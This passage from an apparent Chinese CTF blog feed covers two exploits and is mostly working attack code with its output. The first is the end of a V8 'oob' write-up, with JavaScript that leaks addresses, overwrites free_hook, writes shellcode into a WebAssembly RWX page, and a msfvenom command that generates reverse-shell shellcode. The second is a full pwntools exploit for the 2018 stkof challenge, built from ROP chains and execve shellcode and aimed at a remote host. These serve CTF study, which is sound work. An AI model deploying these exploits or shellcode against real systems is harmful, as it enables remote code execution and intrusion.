class="line">mapped : 0x3a9ed4180f1b --&gt; 0x180b71000055df6d </span><br><span class="line">mapped : 0x3a9ed4180f2b --&gt; 0x180801000055df6d </span><br><span class="line">mapped : 0x3a9ed4181033 --&gt; 0x180b71000055df6d </span><br><span class="line">mapped : 0x3a9ed4181043 --&gt; 0x181f49000055df6d </span><br><span class="line">mapped : 0x3a9ed4181073 --&gt; 0x180b71000055df6d </span><br><span class="line">mapped : 0x3a9ed4181083 --&gt; 0x181f49000055df6d</span><br><span class="line"></span><br><span class="line">gdb-peda$ x/8gx 0x3a9ed4181083 - 3</span><br><span class="line">0x3a9ed4181080: 0x000055df6dff6d40      0x00001ca69a181f49</span><br><span class="line">0x3a9ed4181090: 0x0000000621887fea      0x00000f6ee7b9c469</span><br><span class="line">0x3a9ed41810a0: 0x00001ca69a181f49      0x000000059b40fce6</span><br><span class="line">0x3a9ed41810b0: 0x00000f6ee7b9c4f9      0x00001ca69a180b71</span><br><span class="line"></span><br><span class="line">gdb-peda$ vmmap 0x000055df6dff6d40</span><br><span class="line">Start              End                Perm      Name</span><br><span class="line">0x000055df6dfec000 0x000055df6eab4000 r-xp      /home/wz/v8/v8/out.gn/x64.release/d8</span><br><span class="line"></span><br><span class="line">gdb-peda$ distance 0x000055df6dff6d40 0x000055df6dd59000</span><br><span class="line">From 0x55df6dff6d40 to 0x55df6dd59000: -2743616 bytes, -685904 dwords</span><br></pre></td></tr></table></figure></p>
<p>最终穷搜的代码如下：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> start_addr = addressOf(a) - <span class="number">0x8000n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[*] address of a is 0x"</span>+hex(start_addr));</span><br><span class="line"><span class="keyword">var</span> leak_d8_addr = <span class="number">0n</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    start_addr = start_addr - <span class="number">8n</span>;</span><br><span class="line">    leak_d8_addr = read64(start_addr);</span><br><span class="line">    <span class="keyword">if</span>(((leak_d8_addr &amp; <span class="number">0x0000ff0000000fffn</span>) == <span class="number">0x0000550000000320n</span>) || ((leak_d8_addr &amp; <span class="number">0x0000ff0000000fffn</span>) == <span class="number">0x0000560000000320n</span>))&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"leak process addr success: "</span> + hex(leak_d8_addr));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[*] Done."</span>);</span><br><span class="line">proc_base = leak_d8_addr - <span class="number">0x2b0320n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[*] proc base :0x"</span>+hex(proc_base));</span><br></pre></td></tr></table></figure></p>
<p>后面泄露地址和Getshel的代码(get_shell里销毁对象会调用free_hook)：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_shell</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> shell_str = <span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">"/bin/sh\0"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> printf_got = proc_base + <span class="number">0xd990d0n</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> printf_addr = read64(printf_got);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[*] printf addr :0x"</span>+hex(printf_addr));</span><br><span class="line"><span class="keyword">var</span> libc_base = printf_addr - <span class="number">0x55800n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[*] libc base :0x"</span>+hex(libc_base));</span><br><span class="line"><span class="keyword">var</span> free_hook = libc_base + <span class="number">0x3c67a8n</span>;</span><br><span class="line"><span class="keyword">var</span> system_addr = libc_base + <span class="number">0x45390n</span>;</span><br><span class="line"></span><br><span class="line">writeDataview(free_hook,system_addr);</span><br><span class="line">get_shell();</span><br></pre></td></tr></table></figure>
<p>最后成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wz@wz-virtual-machine:~/v8/v8/out.gn/x64.release$ ./d8 exp.js </span><br><span class="line">[*] address of a is 0x00002a0803a078d8</span><br><span class="line">leak process addr success: 000055da25fe3320</span><br><span class="line">[*] Done.</span><br><span class="line">[*] proc base :0x000055da25d33000</span><br><span class="line">[*] <span class="built_in">printf</span> addr :0x00007fd1ea5be800</span><br><span class="line">[*] libc base :0x00007fd1ea569000</span><br><span class="line">sh: 1: [*]: not found</span><br><span class="line">[*] write to : 0x00007fd1ea92f7a8: 0x00007fd1ea5ae390</span><br><span class="line">sh: 1: : not found</span><br><span class="line">sh: 1: Syntax error: word unexpected (expecting <span class="string">")"</span>)</span><br><span class="line">sh: 1: : not found</span><br><span class="line">sh: 1: Syntax error: word unexpected (expecting <span class="string">")"</span>)</span><br><span class="line">sh: 1: Syntax error: word unexpected (expecting <span class="string">")"</span>)</span><br><span class="line">sh: 1: : not found</span><br><span class="line">sh: 1: : not found</span><br><span class="line">sh: 1:ª: not found</span><br><span class="line">sh: 1: Syntax error: EOF <span class="keyword">in</span> backquote substitution</span><br><span class="line">sh: 1: newll_strے: not found</span><br><span class="line">sh: 1: Syntax error: word unexpected (expecting <span class="string">")"</span>)</span><br><span class="line">sh: 1: Syntax error: word unexpected (expecting <span class="string">")"</span>)</span><br><span class="line">$ sh: 1: Syntax error: word unexpected (expecting <span class="string">")"</span>)</span><br><span class="line">sh: 1: Syntax error: word unexpected (expecting <span class="string">")"</span>)</span><br><span class="line">sh: 1: Syntax error: EOF <span class="keyword">in</span> backquote substitution</span><br><span class="line">sh: 1: ��: not found</span><br><span class="line">sh: 1: Syntax error: word unexpected (expecting <span class="string">")"</span>)</span><br><span class="line">sh: 1: Syntax error: word unexpected (expecting <span class="string">")"</span>)</span><br><span class="line">sh: 1: e: not found</span><br><span class="line">sh: 1: e�: not found</span><br><span class="line">sh: 1: e�,Q: not found</span><br><span class="line">sh: 1: e�,Q: not found</span><br><span class="line">sh: 1: e�,Q: not found</span><br><span class="line">sh: 1: @S: not found</span><br><span class="line">sh: 1: pT: not found</span><br><span class="line">sh: 1: 0T: not found</span><br><span class="line">sh: 1: P: not found</span><br><span class="line">sh: 1: �: not found</span><br><span class="line">sh: 1: Syntax error: word unexpected (expecting <span class="string">")"</span>)</span><br><span class="line">sh: 1: Syntax error: word unexpected (expecting <span class="string">")"</span>)</span><br><span class="line">sh: 1: : not found</span><br><span class="line">sh: 1: 肩: not found</span><br><span class="line">id</span><br><span class="line">uid=1000(wz) gid=1000(wz) groups=1000(wz),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),130(kvm),131(libvirtd),133(ftp)</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<h2 id="wasm-get-shell"><a href="#wasm-get-shell" class="headerlink" title="wasm get shell"></a>wasm get shell</h2><p>上述方法只能实现本地提权，因为我们的目标是服务器，需要弹shell回来。最好的方法就是找个rwxp的段写shellcode，这部分介绍的就是wasm来帮我们解决问题。<br>wasm是一个关于面向Web的通用二进制和文本格式的项目，是一种新的字节码格式，类似能在浏览器中运行的二进制文件格式。<br>在js代码中加入wasm中，程序中会存在一个rwx段，我们可以把sc放到这个段，直接跳过去。  </p>
<h3 id="获取wasm段地址"><a href="#获取wasm段地址" class="headerlink" title="获取wasm段地址"></a>获取wasm段地址</h3><p>编写一段引入wasm的js代码进行调试，可以在<a href="https://wasdk.github.io/WasmFiddle/" target="_blank" rel="noopener">这个网站</a>在线生成wasm代码，代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line">%DebugPrint(f);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>
<p>调试过程如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">DebugPrint: 0x3850e819fab9: [Function] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x201b0b444379 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3850e8182109 &lt;JSFunction (sfi = 0x1a6852d88039)&gt;</span><br><span class="line"> - elements: 0x1be206940c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - <span class="keyword">function</span> prototype: &lt;no-prototype-slot&gt;</span><br><span class="line"> - shared_info: 0x3850e819fa81 &lt;SharedFunctionInfo 0&gt;</span><br><span class="line"> - name: 0x1be206944ae1 &lt;String[<span class="comment">#1]: 0&gt;</span></span><br><span class="line"> - formal_parameter_count: 0</span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - context: 0x3850e8181869 &lt;NativeContext[246]&gt;</span><br><span class="line"> - code: 0x3d6ca6882001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - WASM instance 0x3850e819f8c1</span><br><span class="line"> - WASM <span class="keyword">function</span> index 0</span><br><span class="line"> - properties: 0x1be206940c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    <span class="comment">#length: 0x1a6852d804b9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line">    <span class="comment">#name: 0x1a6852d80449 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line">    <span class="comment">#arguments: 0x1a6852d80369 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line">    <span class="comment">#caller: 0x1a6852d803d9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> - feedback vector: not available</span><br><span class="line">0x201b0b444379: [Map]</span><br><span class="line"> - <span class="built_in">type</span>: JS_FUNCTION_TYPE</span><br><span class="line"> - instance size: 56</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - callable</span><br><span class="line"> - back pointer: 0x1be2069404d1 &lt;undefined&gt;</span><br><span class="line"> - prototype_validity cell: 0x1a6852d80609 &lt;Cell value= 1&gt;</span><br><span class="line"> - instance descriptors (own) <span class="comment">#4: 0x3850e81998a9 &lt;DescriptorArray[4]&gt;</span></span><br><span class="line"> - layout descriptor: (nil)</span><br><span class="line"> - prototype: 0x3850e8182109 &lt;JSFunction (sfi = 0x1a6852d88039)&gt;</span><br><span class="line"> - constructor: 0x1be2069401d9 &lt;null&gt;</span><br><span class="line"> - dependent code: 0x1be2069402c1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Thread 1 <span class="string">"d8"</span> received signal SIGTRAP, Trace/breakpoint <span class="built_in">trap</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment"># shared_info字段</span></span><br><span class="line"></span><br><span class="line">gdb-peda$ job 0x3850e819fa81</span><br><span class="line">0x3850e819fa81: [SharedFunctionInfo] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x1be2069409e1 &lt;Map[56]&gt;</span><br><span class="line"> - name: 0x1be206944ae1 &lt;String[<span class="comment">#1]: 0&gt;</span></span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - function_map_index: 144</span><br><span class="line"> - formal_parameter_count: 0</span><br><span class="line"> - expected_nof_properties: 0</span><br><span class="line"> - language_mode: sloppy</span><br><span class="line"> - data: 0x3850e819fa59 &lt;WasmExportedFunctionData&gt;</span><br><span class="line"> - code (from data): 0x3d6ca6882001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - <span class="keyword">function</span> token position: -1</span><br><span class="line"> - start position: -1</span><br><span class="line"> - end position: -1</span><br><span class="line"> - no debug info</span><br><span class="line"> - scope info: 0x1be206940c61 &lt;ScopeInfo[0]&gt;</span><br><span class="line"> - length: 0</span><br><span class="line"> - feedback_metadata: 0x1be206942a39: [FeedbackMetadata]</span><br><span class="line"> - map: 0x1be206941319 &lt;Map&gt;</span><br><span class="line"> - slot_count: 0</span><br><span class="line"></span><br><span class="line"><span class="comment"># data 字段</span></span><br><span class="line"></span><br><span class="line">gdb-peda$ job 0x3850e819fa59</span><br><span class="line">0x3850e819fa59: [WasmExportedFunctionData] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x1be206945879 &lt;Map[40]&gt;</span><br><span class="line"> - wrapper_code: 0x3d6ca6882001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - instance: 0x3850e819f8c1 &lt;Instance map = 0x201b0b449789&gt;</span><br><span class="line"> - function_index: 0</span><br><span class="line"></span><br><span class="line"><span class="comment"># instance 字段</span></span><br><span class="line"></span><br><span class="line">gdb-peda$ telescope 0x3850e819f8c0+0x88</span><br><span class="line">0000| 0x3850e819f948 --&gt; 0x2142a9697000 --&gt; 0x2142a9697260ba49 </span><br><span class="line">0008| 0x3850e819f950 --&gt; 0xcea73e4e411 --&gt; 0x710000201b0b4491 </span><br><span class="line">0016| 0x3850e819f958 --&gt; 0xcea73e4e681 --&gt; 0x710000201b0b44ad </span><br><span class="line">0024| 0x3850e819f960 --&gt; 0x3850e8181869 --&gt; 0x1be206940f </span><br><span class="line">0032| 0x3850e819f968 --&gt; 0x3850e819f9e9 --&gt; 0x710000201b0b44a1 </span><br><span class="line">0040| 0x3850e819f970 --&gt; 0x1be2069404d1 --&gt; 0x1be2069405 </span><br><span class="line">0048| 0x3850e819f978 --&gt; 0x1be2069404d1 --&gt; 0x1be2069405 </span><br><span class="line">0056| 0x3850e819f980 --&gt; 0x1be2069404d1 --&gt; 0x1be2069405 </span><br><span class="line">gdb-peda$ vmmap 0x2142a9697000</span><br><span class="line">Start              End                Perm      Name</span><br><span class="line">0x00002142a9697000 0x00002142a9698000 rwxp      mapped</span><br></pre></td></tr></table></figure>
<p>根据上述寻址过程可以寻找rwx段地址，代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//leak addr</span></span><br><span class="line"><span class="keyword">var</span> f_addr = addressOf(f);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"f addr: 0x"</span>+hex(f_addr));</span><br><span class="line"><span class="keyword">var</span> shared_info_addr = read64(f_addr+<span class="number">0x18n</span>)<span class="number">-0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_exported_function = read64(shared_info_addr+<span class="number">0x8n</span>)<span class="number">-0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> instance_addr = read64(wasm_exported_function+<span class="number">0x10n</span>)<span class="number">-0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = read64(instance_addr+<span class="number">0x88n</span>);</span><br></pre></td></tr></table></figure>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>利用任意地址写把sc写到这个段，之后通过调用wasm函数获取shell</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line"><span class="comment">//leak addr</span></span><br><span class="line"><span class="keyword">var</span> f_addr = addressOf(f);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"f addr: 0x"</span>+hex(f_addr));</span><br><span class="line"><span class="keyword">var</span> shared_info_addr = read64(f_addr+<span class="number">0x18n</span>)<span class="number">-0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_exported_function = read64(shared_info_addr+<span class="number">0x8n</span>)<span class="number">-0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> instance_addr = read64(wasm_exported_function+<span class="number">0x10n</span>)<span class="number">-0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = read64(instance_addr+<span class="number">0x88n</span>);</span><br><span class="line"><span class="comment">//write sc</span></span><br><span class="line">shellcode = [</span><br><span class="line"><span class="number">0x91969dd1bb48c031n</span>,</span><br><span class="line"><span class="number">0x53dbf748ff978cd0n</span>,</span><br><span class="line"><span class="number">0xb05e545752995f54n</span>,</span><br><span class="line"><span class="number">0x50f3bn</span></span><br><span class="line">];</span><br><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">128</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = addressOf(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line">write64(buf_backing_store_addr, rwx_page_addr);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; shellcode.length; i++)</span><br><span class="line">    data_view.setBigUint64(<span class="number">8</span>*i, shellcode[i], <span class="literal">true</span>);</span><br><span class="line">f();</span><br></pre></td></tr></table></figure>
<h2 id="远程getshell"><a href="#远程getshell" class="headerlink" title="远程getshell"></a>远程getshell</h2><p>在kali上使用msfvenom生成反弹shell的shellcode</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/shell_reverse_tcp LHOST=you_ip_addr LPORT=3389 -f python -o ~/Desktop/shellcode.txt</span><br></pre></td></tr></table></figure>
<p>在服务上监听3389端口本地执行wasm.js，成功获取到shell</p>
<p><img src="/2020/09/03/oob/1.png" alt="shell"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://e3pem.github.io/2019/07/31/browser/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%85%A5%E9%97%A8%E4%B9%8Bstarctf-OOB/" target="_blank" rel="noopener">e3pem</a></p>
<p><a href="https://www.freebuf.com/vuls/203721.html" target="_blank" rel="noopener">walkerfuz</a></p>
]]></content>
      <categories>
        <category>StartCTF 2019</category>
      </categories>
  </entry>
  <entry>
    <title>强网杯2018 stkof</title>
    <url>/2020/09/03/stkof/</url>
    <content><![CDATA[<h1 id="强网杯2018-stkof"><a href="#强网杯2018-stkof" class="headerlink" title="强网杯2018 stkof"></a>强网杯2018 stkof</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>打算做下拟态的两道题，这是第一题</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>pwn1为32位，pwn2为64位，溢出点有错位，pwn1的rtn在pwn2的rbp里，使用add esp,0x100的gadgets让两块gadget区域分开，套路一致，先read改stack_prot为0x7，之后pop_eax放入stack_end，调用make_stack_executable使得栈可执行，call esp调用shellcode即可，中间调用no_nx的时候有点坑，要微调一下放入一个stack_end参数，方可使程序执行。</p>
<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">context.log_level=<span class="string">"DEBUG"</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    context.update(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>)</span><br><span class="line">    p = process(<span class="string">'./pwn1'</span>)</span><br><span class="line"><span class="keyword">elif</span> debug == <span class="number">2</span>:</span><br><span class="line">    context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>)</span><br><span class="line">    p = process(<span class="string">'./pwn2'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    context.update(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>)</span><br><span class="line">    p = remote(<span class="string">'node2.buuoj.cn.wetolink.com'</span>,<span class="number">28459</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#i386</span></span><br><span class="line">add_esp_0xa0 = <span class="number">0x080a1728</span></span><br><span class="line">add_esp_0xd4_p2 = <span class="number">0x0809eb2f</span></span><br><span class="line">add_esp_0x100 = <span class="number">0x0806b225</span></span><br><span class="line">stack_prot = <span class="number">0x080d8fd0</span></span><br><span class="line">stack_end = <span class="number">0x080d8da8</span></span><br><span class="line">p_eax = <span class="number">0x080a8af6</span></span><br><span class="line">mv_edx_eax = <span class="number">0x08056a85</span></span><br><span class="line">p_edx = <span class="number">0x0806e9cb</span></span><br><span class="line">no_nx = <span class="number">0x0809d5d0</span></span><br><span class="line"><span class="comment">#bss_base = elf.bss()</span></span><br><span class="line">bss_base = <span class="number">0x080d7000</span></span><br><span class="line">call_esp = <span class="number">0x080add0f</span></span><br><span class="line">read_addr = <span class="number">0x0806c8e0</span></span><br><span class="line">p3_ret = <span class="number">0x0806a51d</span></span><br><span class="line">dl_pagesize = <span class="number">0x080d99f0</span></span><br><span class="line"><span class="comment">#amd64</span></span><br><span class="line">sec_stack_prot = <span class="number">0x6A0F10</span></span><br><span class="line">sec_stack_end = <span class="number">0x6a0ad0</span></span><br><span class="line">sec_no_nx = <span class="number">0x46b730</span></span><br><span class="line">sec_read = <span class="number">0x43b9c0</span></span><br><span class="line">sec_p_rdi = <span class="number">0x4005f6</span></span><br><span class="line">sec_p_rdx_rsi = <span class="number">0x43d9f9</span></span><br><span class="line">sec_p_rax = <span class="number">0x43b97c</span></span><br><span class="line">sec_call_rsp = <span class="number">0x47e1cb</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"We give you a little challenge, try to pwn it?"</span>)</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x10c</span></span><br><span class="line">    payload += p32(bss_base)</span><br><span class="line">    payload += p32(add_esp_0x100)</span><br><span class="line">    payload += <span class="string">'a'</span>*<span class="number">4</span></span><br><span class="line">    <span class="comment">#amd64</span></span><br><span class="line">    <span class="comment">#payload += 'a'*0xfc</span></span><br><span class="line">    payload += p64(sec_p_rdi)+p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(sec_p_rdx_rsi)+p64(<span class="number">0x4</span>)+p64(sec_stack_prot)</span><br><span class="line">    payload += p64(sec_read)</span><br><span class="line">    payload += p64(sec_p_rax)+p64(sec_stack_end)</span><br><span class="line">    <span class="comment">#sc_64 = asm(shellcraft.amd64.linux.sh())</span></span><br><span class="line">    sc_64 = <span class="string">"\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"</span></span><br><span class="line">    payload += p64(sec_p_rdi)+p64(sec_stack_end)+p64(sec_no_nx)+p64(sec_call_rsp)+sc_64</span><br><span class="line">    payload = payload.ljust(<span class="number">0xfc</span>+<span class="number">0x118</span>,<span class="string">'a'</span>)</span><br><span class="line">    <span class="comment">#i386</span></span><br><span class="line">    <span class="comment">#set prot</span></span><br><span class="line">    payload += p32(read_addr)+p32(p3_ret)+p32(<span class="number">0</span>)+p32(stack_prot)+p32(<span class="number">0x4</span>)</span><br><span class="line">    <span class="comment">#payload += p32(p_eax)+p32(7)</span></span><br><span class="line">    <span class="comment">#payload += p32(p_edx)+p32(stack_prot)</span></span><br><span class="line">    <span class="comment">#payload += p32(mv_edx_eax)</span></span><br><span class="line">    <span class="comment">#set stack end</span></span><br><span class="line">    payload += p32(p_eax)+p32(stack_end)</span><br><span class="line">    payload += p32(no_nx)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment">#sc_32 = asm(shellcraft.i386.linux.sh())</span></span><br><span class="line">    sc_32 = <span class="string">"\x33\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"</span></span><br><span class="line">    payload += p32(p_edx)+p32(stack_end)+p32(call_esp)</span><br><span class="line">    payload += sc_32</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    if debug == 1:</span></span><br><span class="line"><span class="string">        gdb.attach(p,'b* 0x0804892f')</span></span><br><span class="line"><span class="string">    elif debug == 2:</span></span><br><span class="line"><span class="string">        gdb.attach(p,'b* 0x400b33')</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    raw_input()</span><br><span class="line">    p.send(p32(<span class="number">0x7</span>))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>强网杯2018</category>
      </categories>
  </entry>
  <entry>
